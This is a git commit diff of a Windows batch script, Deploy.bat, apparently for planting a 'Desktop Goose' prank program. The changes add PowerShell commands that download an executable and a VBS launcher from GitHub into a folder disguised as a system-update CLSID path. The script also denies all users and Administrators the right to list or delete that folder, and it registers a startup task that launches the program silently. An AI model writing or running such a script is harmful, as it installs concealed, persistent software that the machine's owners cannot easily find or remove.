3ab85ef9d08e809ac7b130e80e6ae59abd45d1a1
Voryx-IT <249783833+Voryx-IT@users.noreply.github.com>
2026-03-25 20:45:00 -0400

    Update Deploy.bat

--- Deploy.bat
+++ Deploy.bat
@@ -1,22 +1,28 @@
 @echo off
+:: Check for Admin Rights
 net session >nul 2>&1
 if %errorLevel% neq 0 (echo [!] Run as Admin & pause & exit)
 
+:: Configuration
 set "fakeID=SystemUpdate.{21EC2020-3AEA-1069-A2DD-08002B30309D}"
-set "laptopPath=C:\ProgramData\%fakeID%\WinServiceUpdate\WinServiceUpdate\SourceFiles"
-set "usbPath=%~dp0WinServiceUpdate\WinServiceUpdate\WinServiceUpdate\SourceFiles"
+set "laptopPath=C:\ProgramData\%fakeID%\WinServiceUpdate"
+:: Use your RAW GitHub links here
+set "rawBase=https://raw.githubusercontent.com/Voryx-IT/Desktop-Goose/main"
 
-echo [1/3] Mirroring Files...
+echo [1/3] Downloading & Mirroring Files...
 if not exist "%laptopPath%" mkdir "%laptopPath%" >nul 2>&1
-xcopy /e /y /i "%usbPath%\*" "%laptopPath%\"
+
+:: Download files directly to the hidden path
+powershell -NoP -Command "iwr '%rawBase%/WinServiceUpdate.exe' -OutFile '%laptopPath%\WinServiceUpdate.exe'"
+powershell -NoP -Command "iwr '%rawBase%/Silencer.vbs' -OutFile '%laptopPath%\Silencer.vbs'"
 
 echo [2/3] Applying Smart Locks...
-:: Remove inheritance and grant Read/Execute (so the goose can actually live)
+:: Grant SYSTEM and Admins the right to run the files
 icacls "C:\ProgramData\%fakeID%" /inheritance:r >nul 2>&1
 icacls "C:\ProgramData\%fakeID%" /grant:r SYSTEM:(OI)(CI)RX >nul 2>&1
 icacls "C:\ProgramData\%fakeID%" /grant:r Administrators:(OI)(CI)RX >nul 2>&1
 
-:: DENY List Folder (RD) and Delete (DE) to hide contents and prevent removal
+:: DENY Folder Listing (RD) and Deletion (DE) to hide and protect
 icacls "C:\ProgramData\%fakeID%" /deny *S-1-1-0:(RD,DE) >nul 2>&1
 icacls "C:\ProgramData\%fakeID%" /deny Administrators:(RD,DE) >nul 2>&1
 
@@ -33,4 +39,4 @@ schtasks /create /f /tn "WinServiceUpdate_Startup" /tr "wscript.exe \"%laptopPat
 echo Launching...
 start "" "wscript.exe" "%laptopPath%\Silencer.vbs"
 echo DONE!
-pause
+:: The Pico's 'Janitor' job will close this window in 15 seconds automatically.
